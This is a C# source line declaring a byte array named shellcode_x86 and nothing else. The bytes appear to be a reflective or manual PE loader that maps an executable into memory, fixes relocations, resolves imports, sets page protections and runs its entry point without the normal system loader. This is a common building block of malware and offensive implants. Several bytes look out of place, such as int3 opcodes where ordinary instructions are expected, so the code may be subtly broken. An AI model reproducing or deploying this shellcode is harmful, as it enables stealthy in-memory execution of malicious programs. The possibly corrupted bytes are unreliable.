byte[] shellcode_x86 = new byte[] {85, 139, 236, 129, 236, 128, 0, 0, 0, 86, 139, 69, 8, 139, 8, 137, 77, 172, 139, 85, 172, 15, 183, 2, 61, 77, 90, 0, 0, 116, 7, 51, 192, 233, 122, 5, 0, 0, 139, 77, 8, 139, 17, 139, 69, 172, 3, 80, 60, 137, 85, 212, 139, 77, 212, 129, 57, 80, 69, 0, 0, 116, 7, 51, 192, 233, 90, 5, 0, 0, 106, 4, 104, 0, 32, 0, 0, 139, 85, 212, 139, 66, 80, 80, 139, 77, 212, 139, 81, 52, 82, 139, 69, 8, 139, 72, 16, 255, 209, 137, 69, 244, 106, 4, 104, 0, 16, 0, 0, 139, 85, 212, 139, 66, 84, 80, 139, 77, 244, 81, 139, 85, 8, 139, 66, 16, 255, 208, 199, 69, 208, 0, 0, 0, 0, 235, 9, 139, 77, 208, 131, 193, 1, 137, 77, 208, 139, 85, 212, 139, 69, 208, 59, 66, 84, 115, 21, 139, 77, 8, 139, 17, 139, 69, 244, 3, 69, 208, 139, 77, 208, 138, 20, 10, 136, 16, 235, 215, 139, 69, 172, 139, 77, 244, 3, 72, 60, 137, 77, 240, 199, 69, 200, 0, 0, 0, 0, 235, 9, 139, 85, 200, 131, 194, 1, 137, 85, 200, 139, 69, 240, 15, 183, 72, 6, 57, 77, 200, 15, 141, 111, 1, 0, 0, 139, 85, 240, 15, 183, 66, 20, 139, 77, 240, 141, 84, 1, 24, 107, 69, 200, 40, 3, 208, 137, 85, 236, 199, 69, 188, 0, 0, 0, 0, 139, 77, 236, 131, 121, 16, 0, 116, 103, 106, 4, 104, 0, 16, 0, 0, 139, 85, 236, 139, 66, 16, 80, 139, 77, 236, 139, 85, 244, 3, 81, 12, 82, 139, 69, 8, 139, 72, 16, 255, 209, 137, 69, 188, 199, 69, 204, 0, 0, 0, 0, 235, 9, 139, 85, 204, 131, 194, 1, 137, 85, 204, 139, 69, 236, 139, 77, 204, 59, 72, 16, 115, 34, 139, 85, 8, 139, 2, 139, 77, 236, 3, 65, 20, 139, 85, 236, 139, 77, 244, 3, 74, 12, 139, 85, 204, 139, 117, 204, 138, 4, 48, 136, 4, 17, 235, 202, 233, 211, 0, 0, 0, 139, 77, 236, 131, 121, 36, 64, 117, 96, 106, 4, 104, 0, 16, 0, 0, 139, 85, 240, 139, 66, 32, 80, 139, 77, 236, 139, 85, 244, 3, 81, 12, 82, 139, 69, 8, 139, 72, 16, 255, 209, 137, 69, 188, 199, 69, 196, 0, 0, 0, 0, 235, 9, 139, 85, 196, 131, 194, 1, 137, 85, 196, 139, 69, 240, 139, 77, 196, 59, 72, 32, 115, 18, 139, 85, 236, 139, 69, 244, 3, 66, 12, 139, 77, 196, 198, 4, 8, 0, 235, 218, 139, 85, 236, 139, 69, 240, 139, 72, 32, 137, 74, 16, 235, 106, 139, 85, 236, 129, 122, 36, 128, 0, 0, 0, 117, 94, 106, 4, 104, 0, 16, 0, 0, 139, 69, 240, 139, 72, 36, 81, 139, 85, 236, 139, 69, 244, 3, 66, 12, 80, 139, 77, 8, 139, 81, 16, 255, 210, 137, 69, 188, 199, 69, 192, 0, 0, 0, 0, 235, 9, 139, 69, 192, 131, 192, 1, 137, 69, 192, 139, 77, 240, 139, 85, 192, 59, 81, 36, 115, 18, 139, 69, 236, 139, 77, 244, 3, 72, 12, 139, 85, 192, 198, 4, 17, 0, 235, 218, 139, 69, 236, 139, 77, 240, 139, 81, 36, 137, 80, 16, 139, 69, 236, 139, 77, 188, 137, 72, 8, 233, 120, 254, 255, 255, 139, 85, 240, 139, 69, 244, 43, 66, 52, 137, 69, 140, 185, 8, 0, 0, 0, 107, 209, 5, 139, 69, 240, 141, 76, 16, 120, 137, 77, 148, 139, 85, 148, 139, 69, 244, 3, 2, 137, 69, 224, 139, 77, 224, 131, 57, 0, 15, 134, 132, 0, 0, 0, 199, 69, 184, 0, 0, 0, 0, 235, 9, 139, 85, 184, 131, 194, 1, 137, 85, 184, 139, 69, 224, 139, 72, 4, 131, 233, 8, 209, 233, 57, 77, 184, 115, 78, 139, 85, 184, 209, 226, 139, 69, 224, 102, 139, 76, 208, 64, 102, 137, 77, 252, 15, 183, 85, 252, 193, 250, 12, 137, 85, 144, 15, 183, 69, 252, 37, 255, 15, 0, 0, 137, 69, 156, 131, 125, 144, 3, 117, 31, 139, 77, 224, 139, 85, 244, 3, 17, 139, 69, 156, 139, 12, 2, 3, 77, 140, 139, 85, 224, 139, 69, 244, 3, 2, 139, 85, 156, 137, 12, 16, 235, 153, 139, 69, 224, 139, 72, 4, 139, 85, 224, 141, 4, 202, 137, 69, 224, 233, 112, 255, 255, 255, 185, 8, 0, 0, 0, 193, 225, 0, 139, 85, 240, 141, 68, 10, 120, 137, 69, 152, 139, 77, 152, 139, 85, 244, 3, 17, 137, 85, 168, 199, 69, 216, 0, 0, 0, 0, 235, 9, 139, 69, 216, 131, 192, 1, 137, 69, 216, 139, 77, 152, 139, 65, 4, 51, 210, 185, 20, 0, 0, 0, 247, 241, 131, 232, 1, 57, 69, 216, 15, 131, 223, 0, 0, 0, 107, 85, 216, 20, 139, 69, 168, 139, 77, 244, 3, 76, 16, 12, 81, 139, 85, 8, 139, 66, 8, 255, 208, 137, 69, 164, 131, 125, 164, 0, 117, 7, 51, 192, 233, 39, 2, 0, 0, 107, 77, 216, 20, 139, 85, 168, 139, 69, 244, 3, 4, 10, 137, 69, 180, 107, 77, 216, 20, 139, 85, 168, 139, 69, 244, 3, 68, 10, 16, 137, 69, 160, 199, 69, 220, 0, 0, 0, 0, 235, 9, 139, 77, 220, 131, 193, 1, 137, 77, 220, 139, 85, 220, 139, 69, 160, 131, 60, 144, 0, 116, 116, 131, 125, 180, 0, 116, 62, 139, 77, 220, 139, 85, 180, 139, 4, 138, 37, 0, 0, 0, 128, 116, 46, 139, 77, 220, 139, 85, 180, 139, 4, 138, 37, 255, 255, 0, 0, 102, 137, 69, 248, 15, 183, 77, 248, 81, 139, 85, 164, 82, 139, 69, 8, 139, 72, 12, 255, 209, 139, 85, 220, 139, 77, 160, 137, 4, 145, 235, 43, 139, 85, 220, 139, 69, 180, 139, 77, 244, 3, 12, 144, 137, 77, 136, 139, 85, 136, 131, 194, 2, 82, 139, 69, 164, 80, 139, 77, 8, 139, 81, 12, 255, 210, 139, 77, 220, 139, 85, 160, 137, 4, 138, 233, 119, 255, 255, 255, 233, 253, 254, 255, 255, 204, 69, 176, 0, 0, 0, 0, 235, 9, 139, 69, 176, 131, 192, 1, 137, 69, 176, 139, 77, 240, 15, 183, 81, 6, 57, 85, 176, 15, 141, 51, 1, 0, 0, 139, 69, 240, 15, 183, 72, 20, 139, 85, 240, 141, 68, 10, 24, 107, 77, 176, 40, 3, 193, 137, 69, 232, 199, 69, 228, 0, 0, 0, 0, 139, 85, 232, 139, 66, 36, 37, 0, 0, 0, 2, 116, 29, 104, 0, 64, 0, 0, 139, 77, 232, 139, 81, 16, 82, 139, 69, 232, 139, 72, 8, 81, 139, 85, 8, 139, 66, 20, 255, 208, 235, 159, 139, 77, 232, 139, 81, 36, 129, 226, 0, 0, 0, 32, 116, 77, 139, 69, 232, 139, 72, 36, 129, 225, 0, 0, 0, 64, 116, 31, 139, 85, 232, 139, 66, 36, 37, 0, 0, 0, 128, 116, 9, 199, 69, 228, 64, 0, 0, 0, 235, 7, 199, 69, 228, 32, 0, 0, 0, 235, 30, 139, 77, 232, 139, 81, 36, 129, 226, 0, 0, 0, 128, 116, 9, 199, 69, 228, 128, 0, 0, 0, 235, 7, 199, 69, 228, 16, 0, 0, 0, 235, 75, 139, 69, 232, 139, 72, 36, 129, 225, 0, 0, 0, 64, 116, 31, 139, 85, 232, 139, 66, 36, 37, 0, 0, 0, 128, 116, 9, 199, 69, 228, 4, 0, 0, 0, 235, 7, 199, 69, 228, 2, 0, 0, 0, 235, 30, 139, 77, 232, 139, 81, 36, 129, 226, 0, 0, 0, 128, 116, 9, 199, 69, 228, 8, 0, 0, 0, 235, 7, 199, 69, 228, 1, 0, 0, 0, 139, 69, 232, 139, 72, 36, 129, 225, 0, 0, 0, 4, 116, 12, 139, 85, 228, 129, 202, 0, 2, 0, 0, 137, 85, 228, 141, 69, 128, 80, 139, 77, 228, 81, 139, 85, 232, 139, 66, 16, 80, 139, 77, 232, 139, 81, 8, 82, 139, 69, 8, 139, 72, 24, 255, 209, 133, 192, 117, 4, 51, 192, 235, 31, 233, 180, 254, 255, 255, 204, 85, 240, 139, 69, 244, 3, 66, 40, 137, 69, 132, 106, 0, 106, 1, 139, 77, 244, 81, 255, 85, 132, 139, 69, 244, 94, 139, 229, 93, 195, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204, 204};